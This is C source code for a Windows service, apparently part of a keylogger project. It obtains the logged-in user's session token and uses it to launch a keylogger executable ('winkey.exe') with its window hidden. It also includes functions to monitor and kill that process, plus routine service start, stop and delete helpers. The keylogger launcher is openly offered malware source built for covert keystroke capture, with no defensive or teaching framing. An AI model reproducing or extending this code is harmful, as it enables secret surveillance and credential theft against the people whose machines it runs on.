#include "../../inc/service_manager.h"

// Token impersonation and keylogger functions

HANDLE GetUserTokenViaWTS()
{
    HANDLE hToken = NULL;
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    
    if (sessionId == 0xFFFFFFFF) {
        SvcReportEvent(TEXT("WTSGetActiveConsoleSessionId failed"));
        return NULL;
    }
    
    if (!WTSQueryUserToken(sessionId, &hToken)) {
        SvcReportEvent(TEXT("WTSQueryUserToken failed"));
        return NULL;
    }
    
    SvcReportEvent(TEXT("Successfully obtained user token via WTS"));
    return hToken;
}

BOOL LaunchKeyloggerInUserSession()
{
    SvcReportEvent(TEXT("Attempting to launch keylogger in user session"));
    
    HANDLE hUserToken = GetUserTokenViaWTS();
    if (!hUserToken) 
    {
        return FALSE;
    }

    TCHAR szKeyloggerPath[MAX_PATH];
    TCHAR szServicePath[MAX_PATH];
    
    if (!GetModuleFileName(NULL, szServicePath, MAX_PATH)) 
    {
        CloseHandle(hUserToken);
        return FALSE;
    }

    // Extract directory and build keylogger path
    TCHAR szServiceDir[MAX_PATH];
    StringCchCopy(szServiceDir, MAX_PATH, szServicePath);
    TCHAR* lastBackslash = _tcsrchr(szServiceDir, TEXT('\\'));
    if (lastBackslash) 
    {
        *lastBackslash = TEXT('\0');
    }
    
    StringCchPrintf(szKeyloggerPath, MAX_PATH, TEXT("%s\\winkey.exe"), szServiceDir);

    // Check if keylogger exists
    if (GetFileAttributes(szKeyloggerPath) == INVALID_FILE_ATTRIBUTES) 
    {
        SvcReportEvent(TEXT("Keylogger executable not found"));
        CloseHandle(hUserToken);
        return FALSE;
    }

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // Hide the window

    BOOL result = CreateProcessAsUserW(
        hUserToken,
        NULL,
        szKeyloggerPath,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    );

    CloseHandle(hUserToken);

    if (result) 
    {
        SvcReportEvent(TEXT("Keylogger launched successfully"));
        
        // Don't wait for process, but store handle for termination
        gKeyloggerProcessInfo = pi;
        CloseHandle(pi.hThread);  // We don't need the thread handle
        
        return TRUE;
    }
    else 
    {
        DWORD error = GetLastError();
        TCHAR errorMsg[256];
        _stprintf_s(errorMsg, _countof(errorMsg), 
                   TEXT("CreateProcessAsUserW failed: %d"), error);
        SvcReportEvent(errorMsg);
        return FALSE;
    }
}

BOOL IsKeyloggerRunning()
{
    if (gKeyloggerProcessInfo.hProcess == NULL)
        return FALSE;

    DWORD dwExitCode;
    if (GetExitCodeProcess(gKeyloggerProcessInfo.hProcess, &dwExitCode))
    {
        return (dwExitCode == STILL_ACTIVE);
    }
    
    return FALSE;
}

VOID TerminateKeylogger()
{
    if (gKeyloggerProcessInfo.hProcess != NULL)
    {
        if (IsKeyloggerRunning())
        {
            TerminateProcess(gKeyloggerProcessInfo.hProcess, 0);
            WaitForSingleObject(gKeyloggerProcessInfo.hProcess, 5000);
        }
        
        CloseHandle(gKeyloggerProcessInfo.hProcess);
        CloseHandle(gKeyloggerProcessInfo.hThread);
        
        gKeyloggerProcessInfo.hProcess = NULL;
        gKeyloggerProcessInfo.hThread = NULL;
        gKeyloggerProcessInfo.dwProcessId = 0;
        gKeyloggerProcessInfo.dwThreadId = 0;
    }
}

// Management functions

VOID __stdcall DoStartSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS_PROCESS ssStatus; 
    DWORD dwBytesNeeded;

    schSCManager = OpenSCManager( 
        NULL,
        NULL,
        SC_MANAGER_ALL_ACCESS);  

    if (NULL == schSCManager) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager, 
        szSvcName,
        SERVICE_ALL_ACCESS);  

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

    if (!StartService(schService, 0, NULL))
    {
        _tprintf(TEXT("StartService failed (%d)\n"), GetLastError());
    }
    else 
    {
        _tprintf(TEXT("Service start pending...\n")); 
        
        // Wait a bit for service to start
        Sleep(2000);
        
        if (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
        {
            if (ssStatus.dwCurrentState == SERVICE_RUNNING)
            {
                _tprintf(TEXT("Service started successfully.\n"));
            }
        }
    }

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

VOID __stdcall DoStopSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    SERVICE_STATUS_PROCESS ssp;  // FIXED: Changed from ssStatus to ssp
    DWORD dwBytesNeeded;

    schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  

    if (NULL == schSCManager) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,         // SCM database 
        szSvcName,            // name of service 
        SERVICE_STOP | SERVICE_QUERY_STATUS);  

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

    if (!ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp))
    {
        _tprintf(TEXT("ControlService failed (%d)\n"), GetLastError());
    }
    else
    {
        _tprintf(TEXT("Service stop pending...\n"));
        
        // Wait for service to stop
        Sleep(2000);
        
        if (QueryServiceStatusEx(schService, SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))  // FIXED: Changed ssStatus to ssp
        {
            if (ssp.dwCurrentState == SERVICE_STOPPED)  // FIXED: Changed ssStatus to ssp
            {
                _tprintf(TEXT("Service stopped successfully.\n"));
            }
        }
    }

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

VOID __stdcall DoDeleteSvc()
{
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;

    schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  

    if (schSCManager == NULL) 
    {
        _tprintf(TEXT("OpenSCManager failed (%d)\n"), GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,       // SCM database 
        szSvcName,          // name of service 
        DELETE);            // need delete access 

    if (schService == NULL)
    { 
        _tprintf(TEXT("OpenService failed (%d)\n"), GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }

    if (!DeleteService(schService)) 
    {
        _tprintf(TEXT("DeleteService failed (%d)\n"), GetLastError()); 
    }
    else 
    {
        _tprintf(TEXT("Service deleted successfully\n")); 
    }
 
    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}